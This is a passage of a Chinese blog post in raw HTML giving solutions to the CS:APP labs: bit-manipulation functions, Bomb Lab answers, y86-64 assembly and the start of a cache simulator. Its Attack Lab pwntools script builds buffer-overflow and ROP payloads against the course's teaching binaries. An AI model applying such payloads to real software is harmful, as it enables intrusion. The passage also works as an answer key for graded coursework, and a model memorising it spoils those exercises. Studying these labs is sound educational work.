^ <span class="number">0x3</span>) &amp; !(z ^ <span class="number">0x3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h4><p>执行运算符 x ? y : z：当 x 不为 0 时，返回 y；否则返回 z。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">  x = !x + ~<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (y &amp; x) | (z &amp; ~x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h4><p>判断 x &lt;= y</p><p><a href="https://zhuanlan.zhihu.com/p/59534845">参考</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> negX=~x+<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> addX=negX+y;</span><br><span class="line">  <span class="keyword">int</span> checkSign = addX&gt;&gt;<span class="number">31</span>&amp;<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> leftBit = <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">int</span> xLeft = x&amp;leftBit;</span><br><span class="line">  <span class="keyword">int</span> yLeft = y&amp;leftBit;</span><br><span class="line">  <span class="keyword">int</span> bitXor = xLeft ^ yLeft;</span><br><span class="line">  bitXor = (bitXor&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> ((!bitXor)&amp;(!checkSign))|(bitXor&amp;(xLeft&gt;&gt;<span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h4><p>实现<code> ！</code>运算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((x|(~x+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h4><p>用二分法来判断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> b16,b8,b4,b2,b1,b0;</span><br><span class="line">  <span class="keyword">int</span> sign=x&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  x = (sign&amp;~x)|(~sign&amp;x);</span><br><span class="line">  b16 = !!(x&gt;&gt;<span class="number">16</span>)&lt;&lt;<span class="number">4</span>;</span><br><span class="line">  x = x&gt;&gt;b16;<span class="comment">//如果有（至少需要16位），则将原数右移16位</span></span><br><span class="line">  b8 = !!(x&gt;&gt;<span class="number">8</span>)&lt;&lt;<span class="number">3</span>;<span class="comment">//剩余位高8位是否有1</span></span><br><span class="line">  x = x&gt;&gt;b8;<span class="comment">//如果有（至少需要16+8=24位），则右移8位</span></span><br><span class="line">  b4 = !!(x&gt;&gt;<span class="number">4</span>)&lt;&lt;<span class="number">2</span>;<span class="comment">//同理</span></span><br><span class="line">  x = x&gt;&gt;b4;</span><br><span class="line">  b2 = !!(x&gt;&gt;<span class="number">2</span>)&lt;&lt;<span class="number">1</span>;</span><br><span class="line">  x = x&gt;&gt;b2;</span><br><span class="line">  b1 = !!(x&gt;&gt;<span class="number">1</span>);</span><br><span class="line">  x = x&gt;&gt;b1;</span><br><span class="line">  b0 = x;</span><br><span class="line">  <span class="keyword">return</span> b16+b8+b4+b2+b1+b0+<span class="number">1</span>;<span class="comment">//+1表示加上符号位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Bomb-Lab"><a href="#Bomb-Lab" class="headerlink" title="Bomb Lab"></a>Bomb Lab</h3><p>其实有re、pwn基础，拆解还不算很困难。（还可以结合<code>ida</code>分析，不过个人感觉怼汇编理解会更好一些.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./bomb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment">#phase_1</span></span><br><span class="line">p.sendline(<span class="string">&quot;Border relations with Canada have never been better.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_2</span></span><br><span class="line">p.sendline(<span class="string">&quot;1 2 4 8 16 32&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_3</span></span><br><span class="line">p.sendline(<span class="string">&quot;1 311&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_3</span></span><br><span class="line">p.sendline(<span class="string">&quot;7 0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_4</span></span><br><span class="line">p.sendline(<span class="string">&quot;YONUFG&quot;</span>)</span><br><span class="line"><span class="comment">#db()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_5</span></span><br><span class="line">p.sendline(<span class="string">&quot;4 3 2 1 6 5&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Attack-Lab"><a href="#Attack-Lab" class="headerlink" title="Attack Lab"></a>Attack Lab</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">argv1 = sys.argv[<span class="number">1</span>]</span><br><span class="line">argv2 = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> argv1 == <span class="string">&quot;part1&quot;</span> :</span><br><span class="line">p = process(argv=[<span class="string">&#x27;./ctarget&#x27;</span>, <span class="string">&quot;-q&quot;</span>])</span><br><span class="line"><span class="keyword">elif</span> argv1 == <span class="string">&quot;part2&quot;</span>:</span><br><span class="line">p = process(argv=[<span class="string">&#x27;./rtarget&#x27;</span>, <span class="string">&quot;-q&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn1</span>():</span></span><br><span class="line"><span class="comment">#ROPgadget --binary ctarget --only &quot;pop|ret&quot;</span></span><br><span class="line">rdi_ret = <span class="number">0x000000000040141b</span></span><br><span class="line"><span class="keyword">if</span> argv2 == <span class="string">&quot;level_1&quot;</span>:</span><br><span class="line">p.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">0x28</span>+p64(<span class="number">0x4017c0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> argv2 == <span class="string">&quot;level_2&quot;</span>:</span><br><span class="line">rdi_ret = <span class="number">0x40141b</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> *<span class="number">0x28</span> + p64(rdi_ret) + p64(<span class="number">0x59b997fa</span>) + p64(<span class="number">0x4017ec</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> argv2 == <span class="string">&quot;level_3&quot;</span>:</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> *<span class="number">0x28</span> + p64(rdi_ret) + p64(<span class="number">0x5561dcb8</span>) + p64(<span class="number">0x4018fa</span>) + <span class="string">&quot;0x59b997fa&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn2</span>():</span></span><br><span class="line"><span class="comment">#ROPgadget --binary rtarget --only &quot;pop|ret&quot;</span></span><br><span class="line">rdi_ret = <span class="number">0x000000000040141b</span></span><br><span class="line"><span class="keyword">if</span> argv2 == <span class="string">&quot;level_2&quot;</span>:</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> *<span class="number">0x28</span> + p64(rdi_ret) + p64(<span class="number">0x59b997fa</span>) + p64(<span class="number">0x4017ec</span>) </span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">elif</span> argv2 == <span class="string">&quot;level_3&quot;</span>:</span><br><span class="line">read_plt = <span class="number">0x400D30</span></span><br><span class="line">main_addr = <span class="number">0x4011AD</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x28</span> + p64(rdi_ret) + p64(<span class="number">0x6054E4</span>) + p64(<span class="number">0x4018fa</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> argv1 == <span class="string">&quot;part1&quot;</span>:</span><br><span class="line">pwn1()</span><br><span class="line"><span class="keyword">elif</span> argv1 == <span class="string">&quot;part2&quot;</span>:</span><br><span class="line">pwn2()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Arch-Lab"><a href="#Arch-Lab" class="headerlink" title="Arch Lab"></a>Arch Lab</h3><blockquote><p>$ sudo apt-get install bison flex</p><p>$ cd Arch_lab</p><p>$ tar xvf  sim.tar</p><p>$ cd sim; make clean; make</p></blockquote><h4 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h4><p>根据<code>examples.c</code>给的三个函数，写出对应的<code>y86-64</code> 汇编代码。</p><blockquote><p>csapp p252 给了示例代码，模仿即可。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#sum.ys</span><br><span class="line">#Execution begins at address 0</span><br><span class="line">.pos 0</span><br><span class="line">irmovq stack, %rsp    # set up stack pointer</span><br><span class="line">call main             # Execute main program</span><br><span class="line">halt  # Terminate program</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">.align 8</span><br><span class="line">ele1:</span><br><span class="line">.quad 0x00a</span><br><span class="line">.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">.quad 0x0b0</span><br><span class="line">.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">.quad 0xc00</span><br><span class="line">.quad 0</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">irmovq ele1, %rdi</span><br><span class="line">call sum_list         # sum_list(list_ptr ls)</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">sum_list:</span><br><span class="line">xorq %rax, %rax       # val &#x3D; 0</span><br><span class="line">jmp loop1             # goto loop1</span><br><span class="line"></span><br><span class="line">loop:</span><br><span class="line">mrmovq 0(%rdi),%rsi   # get ls-&gt;val</span><br><span class="line">addq %rsi, %rax       # val +&#x3D; ls-&gt;val</span><br><span class="line">mrmovq 8(%rdi),%rsi   # get ls-&gt;next</span><br><span class="line">rrmovq %rsi,%rdi  # ls &#x3D; ls-&gt;next</span><br><span class="line"></span><br><span class="line">loop1:</span><br><span class="line">andq %rdi, %rdi       # and $rdi</span><br><span class="line">jne loop              # if !&#x3D; 0 goto loop</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#Stack starts here and grows to lower addresses</span><br><span class="line">.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#rsum.ys</span><br><span class="line">#Execution begins at address 0</span><br><span class="line">.pos 0</span><br><span class="line">irmovq stack, %rsp    # set up stack pointer</span><br><span class="line">call main             # Execute main program</span><br><span class="line">halt  # Terminate program</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">.align 8</span><br><span class="line">ele1:</span><br><span class="line">.quad 0x00a</span><br><span class="line">.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">.quad 0x0b0</span><br><span class="line">.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">.quad 0xc00</span><br><span class="line">.quad 0</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">irmovq ele1, %rdi</span><br><span class="line">call rsum_list         # rsum_list(list_ptr ls)</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">rsum_list:</span><br><span class="line">pushq %r12</span><br><span class="line">xorq %rax, %rax        # val &#x3D; 0</span><br><span class="line">andq %rdi, %rdi        </span><br><span class="line">je return              # if &#x3D;&#x3D; 0 goto return</span><br><span class="line">mrmovq 0(%rdi), %r12   # get ls-&gt;val</span><br><span class="line">mrmovq 8(%rdi), %rdi   # get ls-&gt;next</span><br><span class="line">call rsum_list         # call rsum_list</span><br><span class="line">addq %r12, %rax        # val + rest</span><br><span class="line">return:</span><br><span class="line">popq %r12</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#Stack starts here and grows to lower addresses</span><br><span class="line">.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#rsum.ys</span><br><span class="line">#Execution begins at address 0</span><br><span class="line">.pos 0</span><br><span class="line">irmovq stack, %rsp    # set up stack pointer</span><br><span class="line">call main             # Execute main program</span><br><span class="line">halt  # Terminate program</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">.align 8</span><br><span class="line">src:</span><br><span class="line">.quad 0x00a</span><br><span class="line">.quad 0x0b0</span><br><span class="line">.quad 0xc00</span><br><span class="line"># Destination block</span><br><span class="line">dest:</span><br><span class="line">.quad 0x111</span><br><span class="line">.quad 0x222</span><br><span class="line">.quad 0x333</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">irmovq src, %rdi</span><br><span class="line">irmovq dest, %rsi</span><br><span class="line">irmovq $3, %rdx</span><br><span class="line">call copy_block         # copy_block(long *src, long *dest, long len)</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">copy_block:</span><br><span class="line">irmovq $1, %r13</span><br><span class="line">irmovq $8, %r14</span><br><span class="line">xorq %rax, %rax        # result &#x3D; 0</span><br><span class="line">jmp loop1</span><br><span class="line"></span><br><span class="line">loop:</span><br><span class="line">mrmovq 0(%rdi), %r12</span><br><span class="line">addq %r14, %rdi</span><br><span class="line">rmmovq %r12, (%rsi)</span><br><span class="line">addq %r14, %rsi</span><br><span class="line">xorq %r12, %rax</span><br><span class="line">subq %r13, %rdx</span><br><span class="line">loop1:</span><br><span class="line">andq %rdx, %rdx</span><br><span class="line">jg loop</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#Stack starts here and grows to lower addresses</span><br><span class="line">.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><h4 id="PartB"><a href="#PartB" class="headerlink" title="PartB"></a>PartB</h4><p>按照 <code>iaddq</code> 的属性在 <code>sim/seq/seq-full.hcl</code> 中特定的位置添加 “IIADDQ” 即可</p><h3 id="Cache-Lab"><a href="#Cache-Lab" class="headerlink" title="Cache Lab"></a>Cache Lab</h3><blockquote><p>推荐阅读：</p><p><a href="https://www.bilibili.com/video/BV1rE41127Re?p=41">https://www.bilibili.com/video/BV1rE41127Re?p=41</a></p></blockquote><h4 id="Part-A-1"><a href="#Part-A-1" class="headerlink" title="Part A"></a>Part A</h4><p>在<code>csim.c</code>中写一个Cache，使用LRU替换策略。我们目的就是实现一个功能和<code>csim-ref</code>一样的程序。其实预至的<code>csim-ref</code>是没有脱符号表的…</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200730141947.jpeg" alt="Cache结构"></p><blockquote><p>数据访问：</p><ul><li>L：Load，数据载入，可能发生1次miss</li><li>S：Store，可能发生1次miss</li><li>M：store后再load，两次访存。1 miss &amp; 1 hit + 可能eviction</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> valid_bit;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> tag;</span><br><span class="line"><span class="keyword">int</span> LRU_count;</span><br><span class="line">&#125; Cache_line;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">Cache_line* lines;</span><br><span class="line">&#125; Cache_set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> S;</span><br><span class="line"><span class="keyword">int</span> E;</span><br><span class="line">Cache_set* sets;</span><br><span class="line">&#125; Cache;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> hit_count=<span class="number">0</span>, miss_count=<span class="number">0</span>,eviction_count=<span class="number">0</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">s -- the number of sets</span></span><br><span class="line"><span class="comment">E -- the number of cache lines in one set</span></span><br><span class="line"><span class="comment">b -- the size of one block in one cache line</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printUsage</span><span class="params">(<span 